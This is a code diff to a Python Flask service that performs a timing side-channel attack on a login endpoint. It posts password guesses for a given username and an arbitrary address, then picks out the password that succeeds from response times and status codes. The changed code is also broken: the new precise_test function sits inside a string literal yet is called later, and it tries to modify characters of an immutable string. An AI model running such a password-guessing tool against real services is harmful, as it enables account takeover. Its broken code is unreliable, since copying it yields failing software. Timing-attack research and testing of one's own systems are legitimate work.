@@ -46,13 +46,35 @@ def primary_attack(address, digits, username):
             return timings
         data = {}
 
+
 def check_vulnerable(timings):
     times = [timing['time'] for timing in timings]
     passwords = [timing['password'] for timing in timings]
     corr_time = [timing['time'] for timing in timings if timing['resp'] == 201]
+    corr_passw = [timing['password'] for timing in timings if timing['resp'] == 201]
     mean = np.mean(times)
     print('correct password was {0:.4f} ms faster'.format(float(mean - corr_time[0])*1000))
-    return(mean)
+    return(mean, corr_passw)
+
+"""
+def precise_test(address, correct_passw, username):
+    times = []
+    results = []
+    for x in range(10):
+        passw = correct_passw
+        for idx, char in reversed(list(enumerate(passw))):
+            start = time.perf_counter()
+            req = requests.post(address, data={'username':username, 'password':passw})
+            end = time.perf_counter()
+            times.append(end-start)
+            print(idx)
+            print(char)
+            passw[idx] = chr((ord(passw[idx]))+1)
+        results.append(times)
+        times = []
+    return(results)
+"""
+
 
 def create_app():
     app = Flask(__name__)
@@ -82,11 +104,15 @@ def create_app():
             address = data['address']
             digits = data['digits']
             username = data['username']
-            for x in range(30):
+            correct_passw = ""
+            for x in range(5):
                 timings = primary_attack(address, digits, username)
-                test.append(check_vulnerable(timings))
+                res, correct_passw = check_vulnerable(timings)
+                test.append(res)
             print(np.mean(test))
             print('Results: correct password is {0:.4f} ms faster than average of all results'.format(float(np.mean(test))))
+            prec = precise_test(address, correct_passw, username)
+            print(prec)
             return(np.mean(test))
 
 
